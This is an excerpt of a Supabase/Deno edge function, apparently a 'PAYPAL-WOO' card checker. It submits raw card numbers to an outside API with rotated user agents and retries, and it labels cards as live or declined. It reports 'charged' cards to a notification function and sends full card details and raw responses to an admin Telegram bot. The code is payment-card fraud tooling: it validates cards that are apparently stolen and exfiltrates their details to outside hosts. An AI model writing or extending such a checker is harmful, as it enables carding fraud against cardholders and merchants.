...
const notifyChargedCard = (userId: string, cardDetails: string, status: "CHARGED" | "DECLINED" | "UNKNOWN", responseMessage: string, amount: string, gateway: string) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;
  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` },
    body: JSON.stringify({ user_id: userId, card_details: cardDetails, status, response_message: responseMessage, amount, gateway }),
  }).catch((err) => console.error("[PAYPAL-WOO] notify error:", err));
};
...
const sendAdminDebug = (cardDetails: string, rawResponse: string) => {
  ...
  const message = `🔍 <b>PayPal Woo Debug</b>\n\n<b>Card:</b> <code>${cardDetails}</code>\n<b>Status:</b> UNKNOWN\n\n<b>Raw:</b>\n<pre>${rawResponse.substring(0, 3000)}</pre>`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: ADMIN_TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" }),
  }).catch((err) => console.error("[PAYPAL-WOO] admin debug error:", err));
};
...
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 3;
  const apiUrl = `https://pp-api-gold.vercel.app/pp?cc=${cc}`;
  ...
  try {
    ...
    console.log(`[PAYPAL-WOO] Attempt ${attempt} - Raw:`, rawText);

    let data: Record<string, unknown>;
    try { data = JSON.parse(rawText); } catch { data = { raw: rawText, status: "ERROR", message: "Failed to parse" }; }

    const computedStatus = getStatusFromResponse(data);
    const apiMessage = data.message || data.response || 'No response message';
    ...
    return { computedStatus, apiStatus: data.status || 'UNKNOWN', apiMessage, rawResponse: rawText };
  } catch (error) {
...
serve(async (req) => {
  ...
  try {
    ...
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card data (cc) is required', computedStatus: 'unknown', apiStatus: 'ERROR', apiMessage: 'Card data (cc) is required' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    console.log('[PAYPAL-WOO] Checking card for user:', user.id);
    const data = await performCheck(cc, getRandomUserAgent());

    if (data.computedStatus === 'live') {
      notifyChargedCard(user.id, cc, 'CHARGED', String(data.apiMessage || 'APPROVED'), '$0.00', 'PayPal Woo');
    }
    ...
    console.error('[PAYPAL-WOO] Error:', errorMessage);
    return new Response(JSON.stringify({ error: errorMessage, status: "ERROR", computedStatus: "unknown", apiStatus: "ERROR", apiMessage: errorMessage }),
